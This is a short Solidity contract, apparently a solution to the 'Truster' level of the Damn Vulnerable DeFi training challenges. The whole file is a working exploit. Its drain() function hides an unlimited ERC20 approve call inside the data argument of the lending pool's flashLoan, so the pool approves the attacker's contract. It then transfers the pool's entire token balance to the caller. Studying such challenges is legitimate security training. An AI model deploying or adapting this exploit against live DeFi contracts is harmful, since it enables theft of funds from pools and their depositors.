// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import '../truster/TrusterLenderPool.sol';

contract TrusterAttack {
	IERC20 immutable token;
	TrusterLenderPool immutable pool;

	constructor(address _tokenAddr, address _poolAddr) {
		token = IERC20(_tokenAddr);
		pool = TrusterLenderPool(_poolAddr);
	}

	function drain() public {
		// Encode approve function() of DVT to be passed as a data parameter in pool's flashLoan()
		bytes memory data = abi.encodeWithSignature(
			'approve(address,uint256)',
			address(this),
			2**256 - 1
		);

		// Execute flashLoan() with the msg.sender as borrower and DVT contract as target
		// This does an approval from the pool to this contract.
		pool.flashLoan(0, msg.sender, address(token), data);

		// Now this contract is able to drain the pool, transfering all of its tokens from the pool
		// to the attacker
		token.transferFrom(address(pool), msg.sender, token.balanceOf(address(pool)));
	}
}
